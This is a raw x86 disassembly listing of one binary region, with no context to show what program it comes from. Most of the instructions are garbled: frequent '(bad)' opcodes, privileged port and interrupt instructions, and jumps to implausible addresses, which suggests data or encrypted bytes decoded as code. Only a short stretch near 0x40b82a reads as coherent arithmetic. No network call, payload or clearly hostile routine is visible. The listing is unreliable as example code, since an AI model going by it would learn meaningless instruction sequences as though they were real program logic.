  40b225:	test   DWORD PTR [ebx],eax
  40b227:	xlat   BYTE PTR ds:[ebx]
  40b228:	mov    ch,BYTE PTR [edi-0x32e105e9]
  40b22e:	fwait
  40b22f:	lods   al,BYTE PTR ds:[esi]
  40b230:	fidivr WORD PTR [ebp-0x2e]
  40b233:	aad    0x17
  40b235:	mov    eax,ds:0xd27fdb5f
  40b23a:	sbb    DWORD PTR [ebx+0x7],ebx
  40b23d:	mov    eax,ds:0x4ddb1897
  40b242:	pop    edx
  40b243:	jnp    0x40b1f1
  40b245:	mov    esp,DWORD PTR [ebp+0xd5fac06]
  40b24b:	cdq    
  40b24c:	cmc    
  40b24d:	gs fsubrp st(5),st
  40b250:	inc    ebx
  40b251:	xchg   DWORD PTR [eax-0x5f],edx
  40b254:	push   ss
  40b255:	(bad)  
  40b256:	addr16 pop ss
  40b258:	sbb    DWORD PTR [ebp-0x3b],0xef4c66c2
  40b25f:	dec    ebx
  40b260:	mov    ds:0xb95890c6,eax
  40b265:	inc    esi
  40b266:	fldenv [ecx-0x1e6adfd2]
  40b26c:	mov    BYTE PTR [ebx-0x72],cl
  40b26f:	and    al,0x7
  40b271:	xor    DWORD PTR [ebx+0x77a2e99b],edi
  40b277:	add    BYTE PTR ds:0xed6b9eff,ch
  40b27d:	lds    ebx,FWORD PTR [eax-0x62]
  40b280:	add    bl,bh
  40b282:	cmc    
  40b283:	add    al,bh
  40b285:	pop    edi
  40b286:	mov    ebp,0x4605b23f
  40b28b:	mov    al,ds:0x85fafd0
  40b290:	add    DWORD PTR ds:0xa8044778,esi
  40b296:	stc    
  40b297:	pop    eax
  40b298:	cli    
  40b299:	pushf  
  40b29a:	(bad)  
  40b29b:	in     al,0xf5
  40b29d:	pop    eax
  40b29e:	sbb    eax,0xd577a2e9
  40b2a3:	(bad)  
  40b2a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2a6:	leave  
  40b2a7:	pop    ds
  40b2a8:	adc    BYTE PTR [edi],bh
  40b2aa:	sbb    DWORD PTR ss:[eax+ebp*4+0x617eda73],ebx
  40b2b2:	jno    0x40b2ba
  40b2b4:	fidivr DWORD PTR [esi+0x35d53018]
  40b2ba:	aas    
  40b2bb:	cmp    al,0xd8
  40b2bd:	push   eax
  40b2be:	les    esi,FWORD PTR ds:0xf37e2d01
  40b2c4:	push   ss
  40b2c5:	push   ss
  40b2c6:	cwde   
  40b2c7:	xor    esi,eax
  40b2c9:	inc    eax
  40b2ca:	cmp    DWORD PTR [ecx],esi
  40b2cc:	mov    esi,0x1c57c1af
  40b2d1:	in     al,dx
  40b2d2:	mov    al,ds:0xe8066857
  40b2d7:	stos   BYTE PTR es:[edi],al
  40b2d8:	xchg   edx,eax
  40b2d9:	popf   
  40b2da:	ja     0x40b30f
  40b2dc:	dec    edx
  40b2dd:	push   cs
  40b2de:	fstp   DWORD PTR [eax+0x4cf88b5d]
  40b2e4:	arpl   WORD PTR [esi-0x5dba4262],si
  40b2ea:	xchg   esp,eax
  40b2eb:	pop    ebp
  40b2ec:	xor    al,0x49
  40b2ee:	pop    edi
  40b2ef:	(bad)  
  40b2f0:	movsx  ebp,BYTE PTR [edx-0x43]
  40b2f4:	loopne 0x40b2c6
  40b2f6:	mov    ebx,0xff917c9d
  40b2fb:	mov    dl,0x39
  40b2fd:	retf   0x9d48
  40b300:	add    dh,dh
  40b302:	imul   DWORD PTR [eax+0x5f]
  40b305:	ins    BYTE PTR es:[edi],dx
  40b306:	dec    esi
  40b307:	rcr    DWORD PTR [edi+0x6c8f12b9],0xf8
  40b30e:	jmp    0xc546a7eb
  40b313:	jl     0x40b2d0
  40b315:	xor    DWORD PTR [edi],esp
  40b317:	imul   DWORD PTR [ebp-0x35]
  40b31a:	mov    bh,0x2e
  40b31c:	fcomi  st,st(4)
  40b31e:	push   ss
  40b31f:	sahf   
  40b320:	inc    edx
  40b321:	lock pop ebp
  40b323:	adc    al,0x55
  40b325:	(bad)  
  40b326:	sahf   
  40b327:	xor    esp,esp
  40b329:	dec    edx
  40b32a:	fwait
  40b32b:	mov    esp,0x2bc4547b
  40b330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b331:	adc    al,0x6f
  40b333:	xchg   ebp,eax
  40b334:	sub    DWORD PTR ds:0x16eb4775,esi
  40b33a:	and    al,0xde
  40b33c:	bound  ecx,QWORD PTR [edi-0x38aa533d]
  40b342:	mov    dl,0xb
  40b344:	push   edx
  40b345:	(bad)  
  40b346:	mul    eax
  40b348:	jns    0x40b385
  40b34a:	and    ebp,DWORD PTR [edi]
  40b34c:	test   eax,0xd74af4ff
  40b351:	pop    esi
  40b353:	add    ah,ah
  40b355:	fdiv   DWORD PTR [edi]
  40b357:	fidivr DWORD PTR [ecx]
  40b359:	jge    0x40b3c2
  40b35b:	pop    es
  40b35c:	add    dh,BYTE PTR [eax-0x4d18f26c]
  40b362:	push   edx
  40b363:	mov    eax,ds:0xef704c7
  40b368:	and    BYTE PTR [ebp+esi*2-0x2548509d],0x4d
  40b370:	dec    ebp
  40b371:	sahf   
  40b372:	mov    bh,0x4f
  40b374:	pop    es
  40b375:	mov    ah,0x74
  40b377:	jge    0x40b3f2
  40b379:	cmp    eax,0x65986b97
  40b37e:	(bad)  
  40b37f:	out    0xaf,eax
  40b381:	cmp    DWORD PTR [eax-0x5a7d131b],edx
  40b387:	inc    esp
  40b388:	adc    eax,0xd5ba0a9d
  40b38d:	sbb    al,0x15
  40b38f:	cs mov ebp,0x2063cc55
  40b395:	loop   0x40b3e6
  40b397:	pop    di
  40b399:	retf   
  40b39a:	ss enter 0x1344,0x8d
  40b39f:	sub    al,BYTE PTR [eax]
  40b3a1:	mov    dl,0xb9
  40b3a3:	push   eax
  40b3a4:	das    
  40b3a5:	es pop ebp
  40b3a7:	cmp    esp,DWORD PTR [edx-0x10]
  40b3aa:	cdq    
  40b3ab:	pop    ebp
  40b3ac:	and    edi,DWORD PTR [ecx-0x71baab6a]
  40b3b2:	es and bl,dh
  40b3b5:	sub    ebx,DWORD PTR [esi]
  40b3b7:	(bad)
  40b3ba:	add    ebx,DWORD PTR [edi+0x74]
  40b3bd:	xor    ch,BYTE PTR [esi-0x4fc51ff2]
  40b3c3:	or     edi,esi
  40b3c5:	xchg   edi,eax
  40b3c6:	and    BYTE PTR [esi+0x5e362a55],0x41
  40b3cd:	or     DWORD PTR [edi+0x18a94861],0xffffffe1
  40b3d4:	xor    ah,BYTE PTR [ebx+0x2ecdd65f]
  40b3da:	mov    WORD PTR [esi-0x7f],es
  40b3dd:	sub    DWORD PTR [ebx],edx
  40b3df:	cmp    al,0xcc
  40b3e1:	mov    DWORD PTR es:[esi+0x59659711],edi
  40b3e8:	mov    ch,ch
  40b3ea:	xchg   BYTE PTR [ebx+0x1ae1c413],ah
  40b3f0:	std    
  40b3f1:	jo     0x40b3a5
  40b3f3:	mov    esi,0x39fafc39
  40b3f8:	dec    esp
  40b3f9:	mov    esp,0xc579934a
  40b3fe:	fnstsw WORD PTR [ecx]
  40b400:	gs sub ebx,edi
  40b403:	cmp    ebx,edx
  40b405:	ja     0x40b82a
  40b40b:	mov    edx,DWORD PTR [ebp-0x2c]
  40b40e:	jmp    0x40bcba
  40b413:	jmp    0x40b82a
  40b418:	ror    DWORD PTR [edi-0x34],cl
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x14
  40b425:	cmp    al,0x2f
  40b427:	push   esp
  40b428:	call   0x70bf32b3
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b45f
  40b431:	dec    esi
  40b432:	dec    eax
  40b433:	int3   
  40b434:	aad    0xc1
  40b436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b437:	jb     0x40b481
  40b439:	inc    ecx
  40b43a:	mov    esi,0x50438961
  40b43f:	mov    esp,0x63fb2ca6
  40b444:	sti    
  40b445:	in     eax,0x68
  40b447:	or     al,0x87
  40b449:	xor    ebx,DWORD PTR [edx]
  40b44b:	std    
  40b44c:	ficom  DWORD PTR [esi-0x7b]
  40b44f:	cli    
  40b450:	adc    BYTE PTR [edi+0x7e158769],dh
  40b456:	(bad)  
  40b457:	jl     0x40b40c
  40b459:	stos   DWORD PTR es:[edi],eax
  40b45a:	mov    DWORD PTR [edx],esp
  40b45c:	outs   dx,BYTE PTR ss:[esi]
  40b45e:	sti    
  40b45f:	aas    
  40b460:	or     BYTE PTR [esi],dl
  40b462:	je     0x40b494
  40b464:	and    al,0x1f
  40b467:	test   DWORD PTR [edi+0x3980b7f],edx
  40b46d:	sahf   
  40b46e:	pop    edi
  40b46f:	clc    
  40b470:	inc    edx
  40b471:	xchg   esi,eax
  40b472:	add    DWORD PTR [eax],0xffffffbd
  40b475:	or     edi,DWORD PTR [ebx]
  40b477:	lahf   
  40b478:	(bad)  
  40b479:	xor    ebp,edi
  40b47b:	push   edi
  40b47c:	into   
  40b47d:	pop    edx
  40b47e:	mov    ebp,0x87713563
  40b483:	retf   0xdd73
  40b486:	leave  
  40b487:	mov    esp,0xc715af2e
  40b48c:	test   DWORD PTR [eax+ebp*1],ecx
  40b48f:	and    BYTE PTR [edi+ebp*4+0xc88c731],0x1
  40b497:	loopne 0x40b46a
  40b499:	mov    dl,0xd1
  40b49b:	or     DWORD PTR [esi+0x62],esi
  40b49e:	xchg   esi,eax
  40b49f:	add    BYTE PTR ds:0x51571c83,ah
  40b4a5:	push   0xffffffec
  40b4a7:	dec    edi
  40b4a8:	ror    DWORD PTR [ebx-0xc],1
  40b4ab:	mov    bh,0xcf
  40b4ad:	and    ebp,DWORD PTR [edx]
  40b4af:	or     DWORD PTR [ebx-0x74623f79],esi
  40b4b5:	mov    ah,0xb4
  40b4b7:	xor    cl,BYTE PTR [edx-0x5b1f7f97]
  40b4bd:	xchg   esp,eax
  40b4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4bf:	sub    eax,0xcbbc77f3
  40b4c4:	and    DWORD PTR [ebx+0x6a],esp
  40b4c7:	inc    edx
  40b4c8:	popf   
  40b4c9:	pop    ebx
  40b4ca:	ret    
  40b4cb:	call   0xac9f:0xce3aabb7
  40b4d2:	and    al,0xdc
  40b4d4:	jp     0x40b512
  40b4d6:	sbb    bh,dh
  40b4d8:	sub    eax,0xc60ee0fb
  40b4dd:	sub    al,0x1c
  40b4df:	icebp  
  40b4e0:	cmp    BYTE PTR [edx],dl
  40b4e2:	ds mov edi,0xec559907
  40b4e8:	cs inc ebx
  40b4ea:	sar    ebx,0x43
  40b4ed:	xchg   BYTE PTR [ebp-0x6],ah
  40b4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f1:	add    DWORD PTR [esi],esp
  40b4f3:	sub    ecx,esp
  40b4f5:	mov    eax,0x2a94996c
  40b4fa:	enter  0xc0de,0x75
  40b4fe:	jge    0x40b57a
  40b500:	pop    ss
  40b501:	fstp   TBYTE PTR [ebx+0x5c57441c]
  40b507:	fist   WORD PTR [eax+0x68309b7b]
  40b50d:	test   al,bh
  40b50f:	shl    bl,cl
  40b511:	icebp  
  40b512:	mov    BYTE PTR [esi+0x7ac3afbc],dh
  40b518:	data16 rol BYTE PTR [ebx],cl
  40b51b:	jp     0x40b567
  40b51d:	pop    ebx
  40b51e:	xchg   ecx,eax
  40b51f:	dec    DWORD PTR [eax-0x2dd977e0]
  40b525:	retf   
  40b526:	std    
  40b527:	and    eax,0xeaaca295
  40b52c:	xchg   ebx,eax
  40b52d:	aad    0x16
  40b52f:	inc    esp
  40b530:	pop    ebx
  40b531:	sbb    eax,0xb4b3bc7e
  40b536:	in     al,0x77
  40b538:	div    BYTE PTR [esi-0x39]
  40b53b:	cmp    eax,ebx
  40b53d:	stc    
  40b53e:	mov    dh,0xd4
  40b540:	sub    dh,al
  40b542:	out    0x4a,eax
  40b544:	cmc    
  40b545:	test   BYTE PTR [edi],cl
  40b547:	xchg   ebp,eax
  40b548:	rcl    BYTE PTR [eax-0x80],0x65
  40b54c:	(bad)  
  40b54d:	xchg   ecx,eax
  40b54e:	jmp    0x40b576
  40b550:	jecxz  0x40b573
  40b552:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b553:	cli    
  40b554:	inc    edi
  40b555:	cwde   
  40b556:	popf   
  40b557:	mov    ebp,edi
  40b559:	(bad)  
  40b55a:	xchg   esi,eax
  40b55b:	inc    edx
  40b55c:	or     dh,BYTE PTR [eax]
  40b55e:	mov    al,0x0
  40b560:	(bad)  
  40b561:	into   
  40b562:	ins    BYTE PTR es:[edi],dx
  40b563:	and    al,0x8c
  40b565:	and    BYTE PTR [eax-0x77],al
  40b568:	and    eax,0x23dc2787
  40b56d:	jo     0x40b57d
  40b56f:	and    al,0xbd
  40b571:	pop    esp
  40b572:	lahf   
  40b573:	cmp    dl,BYTE PTR [edi+0x7769250b]
  40b579:	fisubr DWORD PTR [ebx-0x62]
  40b57c:	jmp    0x40b5d0
  40b57e:	mov    esi,0x44ff92dc
  40b583:	jns    0x40b56c
  40b585:	imul   ebx,DWORD PTR [ebp+eiz*1-0x68],0x1
  40b58a:	lods   al,BYTE PTR ds:[esi]
  40b58b:	fwait
  40b58c:	in     eax,dx
  40b58d:	sbb    eax,0xd8aef377
  40b592:	mov    edi,0x78abac9c
  40b597:	ins    DWORD PTR es:[edi],dx
  40b598:	jne    0x21f8e6d7
  40b59e:	retf   0xfc08
  40b5a1:	dec    eax
  40b5a2:	cs mov esi,0x1ae659b3
  40b5a8:	(bad)  
  40b5a9:	pop    es
  40b5aa:	mov    ebp,0x8d1894cd
  40b5af:	sub    eax,0xca03c44a
  40b5b4:	add    eax,0x6d0eb4e5
  40b5b9:	fwait
  40b5ba:	in     al,0xaf
  40b5bc:	push   ds
  40b5bd:	frstor [ebx+0xd]
  40b5c0:	jmp    0x44f8:0x352a99d5
  40b5c7:	cdq    
  40b5c8:	inc    eax
  40b5c9:	aam    0x41
  40b5cb:	fidiv  DWORD PTR [esi+0x18]
  40b5ce:	cmp    BYTE PTR [edx-0x1fb6ed3c],ah
  40b5d4:	jmp    0x920b:0x42380c8c
  40b5db:	or     eax,0x6264b767
  40b5e0:	daa    
  40b5e1:	cmp    al,0xa0
  40b5e3:	es dec edi
  40b5e5:	push   edx
  40b5e6:	leave  
  40b5e7:	sbb    dl,BYTE PTR [edi]
  40b5e9:	hlt    
  40b5ea:	rcr    DWORD PTR [ebp+0x24d5be8e],cl
  40b5f0:	xor    BYTE PTR [bp+di+0x16],0xde
  40b5f5:	pop    es
  40b5f6:	mov    dh,0x9e
  40b5f8:	add    BYTE PTR [esi],dl
  40b5fa:	loop   0x40b5c3
  40b5fc:	lds    edx,FWORD PTR [esi]
  40b5fe:	popf   
  40b5ff:	scas   al,BYTE PTR es:[edi]
  40b600:	(bad)  
  40b601:	add    ebp,edi
  40b603:	inc    ebx
  40b604:	imul   eax,edi,0x6
  40b607:	inc    eax
  40b608:	popa   
  40b609:	test   DWORD PTR [esi],0x635437fe
  40b60f:	jmp    0x59c1bb55
  40b614:	or     al,0xb3
  40b616:	rsm    
  40b618:	scas   al,BYTE PTR es:[edi]
  40b619:	fadd   st,st(3)
  40b61b:	jb     0x40b612
  40b61d:	push   ds
  40b61e:	ss and al,0x37
  40b621:	shr    eax,0x2e
  40b624:	(bad)  
  40b625:	push   ebx
  40b626:	in     al,0xe4
  40b628:	push   cs
  40b629:	popa   
  40b62a:	(bad)  
  40b62b:	(bad)  
  40b62c:	stc    
  40b62d:	sbb    eax,0x99bb69b4
  40b632:	sbb    al,bl
  40b634:	dec    ebx
  40b635:	(bad)  
  40b636:	push   edx
  40b637:	mov    ebx,0x601f91b6
  40b63c:	and    eax,0xd175b0f
  40b641:	and    esp,ebx
  40b643:	repz mov eax,edx
  40b646:	cmp    BYTE PTR [esi+0x61],al
  40b649:	dec    ecx
  40b64a:	inc    eax
  40b64b:	and    DWORD PTR [edi],edi
  40b64d:	jp     0x40b5fb
  40b64f:	les    edx,FWORD PTR [edx]
  40b651:	sub    DWORD PTR [ecx],edi
  40b653:	fbstp  TBYTE PTR [ebx]
  40b655:	and    al,0xa7
  40b657:	fcomp  st(0)
  40b659:	stc    
  40b65a:	nop
  40b65b:	push   ecx
  40b65c:	inc    esi
  40b65d:	push   0xce615f33
  40b662:	int3   
  40b663:	xchg   edx,eax
  40b664:	cmp    al,0x11
  40b666:	out    dx,al
  40b667:	jnp    0x40b66f
  40b669:	mov    gs,WORD PTR [ebx]
  40b66b:	adc    bl,0x88
  40b66e:	jbe    0x40b6bb
  40b670:	mov    ch,bh
  40b672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b673:	sbb    eax,0xb8c62f06
  40b678:	int3   
  40b679:	aaa    
  40b67a:	mov    esi,0xfc618661
  40b67f:	bound  esi,QWORD PTR [esi]
  40b681:	pop    ss
  40b682:	test   dl,dh
  40b684:	mov    ch,0x92
  40b686:	xchg   DWORD PTR [ebx+esi*2+0x7c],ecx
  40b68a:	jle    0x40b616
  40b68c:	mov    bl,0xf2
  40b68e:	aam    0x74
  40b690:	dec    ebp
  40b691:	mov    edx,0x21f15ac4
  40b696:	mov    DWORD PTR [esi-0x67],ecx
  40b699:	cmp    al,0x1e
  40b69b:	aam    0x31
  40b69d:	adc    BYTE PTR [edx-0x5edd2397],ah
  40b6a3:	lods   eax,DWORD PTR ds:[esi]
  40b6a4:	leave  
  40b6a5:	push   0xab0e713c
  40b6aa:	daa    
  40b6ab:	xlat   BYTE PTR ds:[ebx]
  40b6ac:	add    BYTE PTR [eax],bh
  40b6ae:	mov    ss,WORD PTR [ebx]
  40b6b0:	(bad)  
  40b6b1:	int    0x18
  40b6b3:	test   BYTE PTR [edx],dl
  40b6b5:	or     al,0xb
  40b6b7:	daa    
  40b6b8:	ret    
  40b6b9:	popf   
  40b6ba:	daa    
  40b6bb:	sbb    edx,DWORD PTR [esi+0x525ccfda]
  40b6c1:	in     eax,dx
  40b6c2:	(bad)  
  40b6c3:	sub    eax,0x12dbd93d
  40b6c8:	push   0xbffd2a84
  40b6cd:	or     esp,ebx
  40b6cf:	pop    esi
  40b6d0:	sub    eax,0xabffb63e
  40b6d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d6:	xchg   ebx,eax
  40b6d7:	in     al,0x3e
  40b6d9:	push   0x6fc67f23
  40b6de:	lahf   
  40b6df:	fnsave ss:[ebx-0x577a4ebc]
  40b6e6:	xchg   ebx,eax
  40b6e7:	jb     0x40b707
  40b6e9:	sub    BYTE PTR [edx+0x32],0x5d
  40b6ed:	xchg   ebx,eax
  40b6ee:	push   ds
  40b6ef:	imul   ecx,ebp,0xffffffc2
  40b6f2:	mov    ah,0x8e
  40b6f4:	bound  ebx,QWORD PTR [eax]
  40b6f6:	and    ah,BYTE PTR [edi]
  40b6f8:	dec    esp
  40b6f9:	(bad)  
  40b6fa:	hlt    
  40b6fb:	(bad)  
  40b6fc:	and    BYTE PTR [ebp-0x39],cl
  40b6ff:	mov    al,0xb5
  40b701:	sahf   
  40b702:	push   cs
  40b703:	jle    0x40b691
  40b705:	xchg   esi,eax
  40b706:	dec    edi
  40b707:	pop    edx
  40b708:	sub    BYTE PTR [eax-0x604930e6],cl
  40b70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b70f:	jbe    0x40b6a6
  40b711:	dec    eax
  40b712:	addr16 aam 0x82
  40b715:	xchg   ebp,eax
  40b716:	stos   DWORD PTR es:[edi],eax
  40b717:	mov    ds:0xf3b86938,eax
  40b71c:	mov    ch,0x21
  40b71e:	out    0x14,eax
  40b720:	std    
  40b721:	cmp    dh,BYTE PTR [ecx+0x79]
  40b724:	adc    al,0xf2
  40b726:	iret   
  40b727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b728:	ins    DWORD PTR es:[edi],dx
  40b729:	dec    ebx
  40b72a:	xchg   ebp,eax
  40b72b:	pop    edi
  40b72c:	pop    esi
  40b72d:	sahf   
  40b72e:	push   cs
  40b72f:	jnp    0x40b6fe
  40b731:	push   edi
  40b732:	popf   
  40b733:	sub    ebp,DWORD PTR [edi]
  40b735:	add    DWORD PTR [esi+0xd],ebp
  40b738:	mov    cl,0xd8
  40b73a:	mov    edx,DWORD PTR [ebp-0x6]
  40b73d:	push   ss
  40b73e:	fwait
  40b73f:	inc    edi
  40b740:	mov    ss,WORD PTR [ebx+0x4b]
  40b743:	rcl    DWORD PTR [edi+0x4d],1
  40b746:	pop    es
  40b747:	bound  ebp,QWORD PTR [edi-0x3814ce0b]
  40b74d:	out    dx,eax
  40b74e:	mov    ebx,DWORD PTR [edx]
  40b750:	dec    ebx
  40b751:	xor    BYTE PTR ds:0xf050ffe,0x78
  40b758:	xor    al,0x2
  40b75a:	fldcw  WORD PTR [edi]
  40b75c:	jae    0x40b6f3
  40b75e:	leave  
  40b75f:	repz mov cl,0x85
  40b762:	pop    esp
  40b763:	repnz aas 
  40b765:	(bad)  
  40b767:	cmp    al,0x6
  40b769:	or     al,0x5e
  40b76b:	add    ah,BYTE PTR ds:0xdba15b89
  40b771:	cmp    ch,BYTE PTR [edi]
  40b773:	mov    ch,0xbb
  40b775:	mov    ds:0xbb72aee9,al
  40b77a:	pop    esp
  40b77b:	inc    ebx
  40b77c:	lea    eax,[ebp-0x4d]
  40b77f:	xchg   esp,eax
  40b780:	out    0xfc,eax
  40b782:	(bad)  
  40b783:	icebp  
  40b784:	bound  ebp,QWORD PTR [ebx-0x3a419029]
  40b78a:	xchg   BYTE PTR [edx],ah
  40b78c:	fild   DWORD PTR [edx+0x57]
  40b78f:	in     al,dx
  40b790:	ja     0x40b7dc
  40b792:	scas   al,BYTE PTR es:[edi]
  40b793:	push   cs
  40b794:	rol    DWORD PTR [ebx],cl
  40b796:	jp     0x40b746
  40b798:	jnp    0x40b73e
  40b79a:	sbb    ecx,edi
  40b79c:	dec    edx
  40b79d:	test   BYTE PTR [edi-0xd6d07ca],dl
  40b7a3:	xchg   esp,eax
  40b7a4:	xchg   edi,eax
  40b7a5:	js     0x40b743
  40b7a7:	das    
  40b7a8:	sbb    edi,DWORD PTR [ebp-0x23]
  40b7ab:	push   ebx
  40b7ac:	sbb    eax,0x60073a12
  40b7b1:	xchg   BYTE PTR [edi+0x2699915f],ch
  40b7b7:	dec    eax
  40b7b8:	or     BYTE PTR [ebp+0x34],dl
  40b7bb:	dec    ebp
  40b7bc:	mov    esi,0xe0ec797a
  40b7c1:	les    eax,FWORD PTR [ebp+0x8323977]
  40b7c7:	mov    ebx,0xdf40488c
  40b7cc:	test   DWORD PTR [ecx-0x27],edi
  40b7cf:	jp     0x40b79e
  40b7d1:	fisub  DWORD PTR [edx-0x19bbdea5]
  40b7d7:	push   es
  40b7d8:	cmp    ch,BYTE PTR [bx+di+0x5e8d]
  40b7dd:	mov    dh,0xb2
  40b7df:	cmp    DWORD PTR [ecx-0x5fe49451],esp
  40b7e5:	sbb    DWORD PTR [ebx-0x18c8d61f],0x19
  40b7ec:	sub    BYTE PTR [ecx],0x75
  40b7ef:	fxam   
  40b7f1:	clc    
  40b7f2:	mov    bh,0x56
  40b7f4:	inc    edi
  40b7f5:	add    al,0xf5
  40b7f7:	popa   
  40b7f8:	stc    
  40b7f9:	adc    eax,0x65f2f21a
  40b7fe:	popf   
  40b7ff:	sub    al,0x99
  40b801:	inc    ecx
  40b802:	fs int 0x12
  40b805:	lea    edi,[esi]
  40b807:	rcr    BYTE PTR [ebp-0x199eefb0],cl
  40b80d:	push   cs
  40b80e:	push   ds
  40b80f:	ins    DWORD PTR es:[edi],dx
  40b810:	jmp    0x5d6e0bcc
  40b815:	jno    0x40b86e
  40b817:	jnp    0x40b88e
  40b819:	mov    bl,0x96
  40b81b:	(bad)  
  40b81c:	or     BYTE PTR [ebp+0x19baf899],0x20
  40b823:	mov    eax,0xd7f65638
  40b828:	(bad)  
  40b829:	aaa    
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	xchg   edx,ecx
  40b8a6:	out    dx,eax
  40b8a7:	je     0x40b88b
  40b8a9:	cmp    BYTE PTR [esi+0x7e],0x70
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b876
  40b8b1:	mov    eax,ds:0x35d5e920
  40b8b6:	ds ss or al,0xaa
  40b8ba:	sbb    al,0x6a
  40b8bc:	push   esp
  40b8bd:	mov    ds:0x953ba546,al
  40b8c2:	outs   dx,BYTE PTR ds:[esi]
  40b8c3:	xor    ah,al
  40b8c5:	push   0x6a
  40b8c7:	xchg   edx,eax
  40b8c8:	cdq    
  40b8c9:	mov    cl,0xc8
  40b8cb:	xor    BYTE PTR [eax+0x2c5f9b56],cl
  40b8d1:	and    eax,0xc4a0b792
  40b8d6:	mov    ah,0x72
  40b8d8:	push   ds
  40b8d9:	sbb    BYTE PTR [esi],al
  40b8db:	out    dx,al
  40b8dc:	jle    0x40b90f
  40b8de:	and    BYTE PTR [esi-0x6],al
  40b8e1:	xor    ch,cl
  40b8e3:	aam    0x7a
  40b8e5:	add    ebp,ebp
  40b8e7:	xchg   edx,eax
  40b8e8:	sbb    edx,DWORD PTR [eax+0x1a]
  40b8eb:	cs sahf 
  40b8ed:	sub    ah,ah
  40b8ef:	call   0x422fc962
  40b8f4:	inc    ebp
  40b8f5:	repz jo 0x40b95f
  40b8f8:	xchg   esp,eax
  40b8f9:	cmp    DWORD PTR [esi+0x28],edx
  40b8fc:	sbb    cl,BYTE PTR ds:0xfacd7dbf
  40b902:	stos   DWORD PTR es:[edi],eax
  40b903:	jnp    0x40b946
  40b905:	test   DWORD PTR [edx+0x46b4b14f],0xc2ebcddc
  40b90f:	call   0x6c23e670
  40b914:	adc    DWORD PTR [edx],0xffffff94
  40b917:	mov    edx,0xbde06d17
  40b91c:	jns    0x40b8f6
  40b91e:	push   cs
  40b91f:	pop    es
  40b920:	cmp    dl,ch
  40b922:	lahf   
  40b923:	scas   eax,DWORD PTR es:[edi]
  40b924:	inc    edi
  40b925:	pushf  
  40b926:	gs jnp 0x40b9a0
  40b929:	push   0x1d
  40b92b:	cmp    al,0x55
  40b92d:	(bad)  
  40b92e:	repnz rcr BYTE PTR [edx],1
  40b931:	je     0x40b911
  40b933:	sbb    al,0x84
  40b935:	xchg   ecx,eax
  40b936:	test   eax,0x536cc044
  40b93b:	and    al,0xc6
  40b93d:	pop    ebp
  40b93e:	pop    esp
  40b93f:	fld    TBYTE PTR [esi+0x15]
  40b942:	push   ecx
  40b943:	retf   0x5a31
  40b946:	mov    BYTE PTR [eax+0x670b8582],bh
  40b94c:	lea    esp,[edx+0x7e]
  40b94f:	outs   dx,DWORD PTR ds:[esi]
  40b950:	ins    DWORD PTR es:[edi],dx
  40b951:	fnstcw WORD PTR [esi+0x21935285]
  40b957:	lods   al,BYTE PTR ds:[esi]
  40b958:	sub    esi,DWORD PTR [esi]
  40b95a:	cwde   
  40b95b:	inc    ebp
  40b95c:	enter  0xc47d,0x38
  40b960:	xchg   esi,eax
  40b961:	test   DWORD PTR [edi+0x76],esp
  40b964:	enter  0xb37b,0x32
  40b968:	mov    ch,0xad
  40b96a:	push   ss
  40b96b:	clc    
  40b96c:	or     esi,DWORD PTR [edx+0x65]
  40b96f:	sub    al,0xaf
  40b971:	call   FWORD PTR [eax+edx*4+0x12]
  40b975:	dec    esi
  40b976:	inc    esi
  40b977:	mov    eax,ds:0xc1f685e
  40b97c:	lods   eax,DWORD PTR ds:[esi]
  40b97d:	ss into 
  40b97f:	cmp    eax,0xd7e31921
  40b984:	xchg   edi,eax
  40b985:	inc    ebp
  40b986:	mov    ecx,0xbc4f5abb
  40b98b:	and    BYTE PTR [edx],bh
  40b98d:	sti    
  40b98e:	(bad)  
  40b990:	gs (bad) 
  40b992:	pop    ebp
